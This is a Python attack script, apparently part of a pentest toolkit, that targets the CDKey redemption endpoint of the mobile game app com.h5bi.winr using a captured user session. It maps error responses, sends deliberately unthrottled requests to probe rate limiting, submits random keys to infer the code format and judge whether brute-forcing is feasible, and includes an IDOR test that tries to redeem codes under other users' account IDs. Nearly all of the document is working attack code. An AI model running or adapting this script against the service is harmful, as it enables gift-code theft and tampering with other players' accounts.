"""
CDKey Analysis & Enumeration — com.h5bi.winr v1.0.1
Endpoint: /v1/user/actCdKey

Tests:
  1. Response analysis — identify valid vs invalid CDKey error messages
  2. CDKey format reverse engineering from RedeemCode UI patterns
  3. Rate limiting detection
  4. Entropy analysis — is the CDKey space bruteforceable?

IMPORTANT: This script is rate-limited by default (1 req/2s).
           Adjust RATE_LIMIT_DELAY for your authorized test.

Usage: python3 03_cdkey_analysis.py
"""

import time
import string
import random
import json
import urllib3
import requests
from sign_helper import SESSION as CAPTURED_SESSION, SERVERS

urllib3.disable_warnings()

RATE_LIMIT_DELAY = 2.0  # seconds between requests


def try_cdkey(session: QuickGameSession, cdkey: str, game_role_id: str = "1",
              server_id: str = "1") -> dict:
    """Submit a CDKey and parse the response."""
    resp = session.post("/v1/user/actCdKey", data={
        "cdkey":       cdkey,
        "gameRoleId":  game_role_id,
        "serverId":    server_id,
    })
    try:
        data = resp.json()
        return {
            "cdkey":   cdkey,
            "status":  resp.status_code,
            "code":    data.get("code"),
            "msg":     data.get("msg", ""),
            "data":    data.get("data"),
            "raw":     data,
        }
    except Exception:
        return {
            "cdkey":   cdkey,
            "status":  resp.status_code,
            "code":    None,
            "msg":     resp.text[:200],
            "data":    None,
        }


def analyze_error_messages(session: QuickGameSession):
    """
    Probe CDKey endpoint with clearly invalid keys to map error codes.
    Goal: distinguish "key not found" from "key already used" from "key valid".
    """
    print("\n" + "="*55)
    print("  TEST 1: CDKey Error Message Analysis")
    print("="*55)

    test_keys = [
        "",                        # empty
        "A",                       # too short
        "AAAA-BBBB-CCCC-DDDD",    # common format guess
        "0000-0000-0000-0000",     # all zeros
        "ZZZZ-ZZZZ-ZZZZ-ZZZZ",    # all max
        "PENTEST123",              # alphanumeric no separator
        "PENTEST-2024-DRAGON",     # with separators
        "1234567890",              # numeric
        "ABC123DEF456",            # mixed 12-char
        "DRAGONBALL2024",          # themed key guess
        "DRAGON-BALL-IDLE",        # formatted guess
    ]

    error_map = {}
    for key in test_keys:
        result = try_cdkey(session, key)
        code = result.get("code")
        msg  = result.get("msg")
        print(f"  [{result['status']}] key={repr(key):<25} code={code} msg={repr(msg)}")
        if msg not in error_map:
            error_map[msg] = code
        time.sleep(RATE_LIMIT_DELAY)

    print(f"\n  Distinct error messages observed: {len(error_map)}")
    for msg, code in error_map.items():
        print(f"    code={code}: {repr(msg)}")

    return error_map


def detect_rate_limiting(session: QuickGameSession):
    """
    Send rapid requests to detect rate limiting / account lockout.
    """
    print("\n" + "="*55)
    print("  TEST 2: Rate Limiting Detection")
    print("="*55)

    results = []
    for i in range(10):
        key = f"TEST-RATE-LIMIT-{i:04d}"
        start = time.time()
        result = try_cdkey(session, key)
        elapsed = time.time() - start
        results.append((i, result["status"], result["code"], elapsed))
        print(f"    req #{i+1}: status={result['status']} code={result['code']} "
              f"msg={repr(result['msg'])[:50]} t={elapsed:.2f}s")
        # No delay — intentionally rapid to trigger rate limiting

    # Check for rate limit indicators
    statuses = [r[1] for r in results]
    if 429 in statuses:
        print("\n  [!] Rate limiting detected (HTTP 429)")
    elif any(r[2] in [10, 100, -100, 429, 1001] for r in results):
        print("\n  [!] Possible rate limiting (error code change)")
    else:
        print("\n  [+] No rate limiting detected in 10 rapid requests")


def analyze_cdkey_format(session: QuickGameSession):
    """
    Attempt to infer CDKey format from UI strings and test structural variants.
    From DEX: 'cdkey_code', 'cdkey_uid', 'cdkey_edit_layout' suggest simple format.
    QuickGame SDK CDKeys typically: 8-16 alphanumeric chars, sometimes with dashes.
    """
    print("\n" + "="*55)
    print("  TEST 3: CDKey Format Inference")
    print("="*55)

    # Test different structural formats
    formats_to_test = []
    chars_upper = string.ascii_uppercase + string.digits

    # Common CDKey formats
    test_formats = [
        # Length variants (no separator)
        "".join(random.choices(chars_upper, k=n))
        for n in [6, 8, 10, 12, 16, 20]
    ] + [
        # Separated formats
        "-".join(["".join(random.choices(chars_upper, k=4)) for _ in range(4)]),
        "-".join(["".join(random.choices(chars_upper, k=4)) for _ in range(3)]),
        "-".join(["".join(random.choices(chars_upper, k=6)) for _ in range(2)]),
        # Numeric only
        "".join(random.choices(string.digits, k=12)),
        # Lowercase
        "".join(random.choices(string.ascii_lowercase + string.digits, k=12)),
    ]

    format_responses = {}
    for key in test_formats:
        result = try_cdkey(session, key)
        fmt_class = f"len={len(key.replace('-',''))}_sep={'yes' if '-' in key else 'no'}"
        code = result["code"]
        msg  = result["msg"]
        print(f"  key={key:<25} code={code} msg={repr(msg)[:60]}")
        if msg not in format_responses:
            format_responses[msg] = []
        format_responses[msg].append(key)
        time.sleep(RATE_LIMIT_DELAY)

    print(f"\n  Format grouping by response message:")
    for msg, keys in format_responses.items():
        print(f"    msg={repr(msg)}: {len(keys)} keys")

    # If one format gets a different error (e.g., "already used" vs "not found")
    # that reveals the valid format
    if len(format_responses) > 1:
        print("\n  [!] Different error messages for different formats — may indicate format validation!")


def test_cdkey_with_uid_swap(session: QuickGameSession, valid_cdkey: str):
    """
    If a CDKey is single-use per account but reusable across accounts,
    test activating it with a different uid (IDOR on CDKey redemption).
    """
    if not valid_cdkey:
        print("\n[SKIP] CDKey UID swap — provide valid_cdkey")
        return

    print("\n" + "="*55)
    print(f"  TEST 4: CDKey UID Swap (IDOR) — key={valid_cdkey}")
    print("="*55)

    own_uid = int(session.uid)
    target_uids = [str(own_uid + i) for i in range(1, 4)]

    for uid in target_uids:
        resp = session.post("/v1/user/actCdKey", data={
            "cdkey":  valid_cdkey,
            "uid":    uid,          # Override uid in POST body
        })
        try:
            data = resp.json()
            print(f"  uid={uid}: code={data.get('code')} msg={data.get('msg')}")
        except Exception:
            print(f"  uid={uid}: {resp.text[:100]}")
        time.sleep(RATE_LIMIT_DELAY)


if __name__ == "__main__":
    print("[*] CDKey Analysis — com.h5bi.winr v1.0.1")
    print(f"    uid: {CAPTURED_SESSION.uid} | server: {CAPTURED_SESSION.server}\n")

    error_map = analyze_error_messages(CAPTURED_SESSION)
    detect_rate_limiting(CAPTURED_SESSION)
    analyze_cdkey_format(CAPTURED_SESSION)

    # If you've captured a valid CDKey from Burp:
    # test_cdkey_with_uid_swap(CAPTURED_SESSION, "VALID-CDKEY-HERE")

    print("\n[*] CDKey analysis complete.")
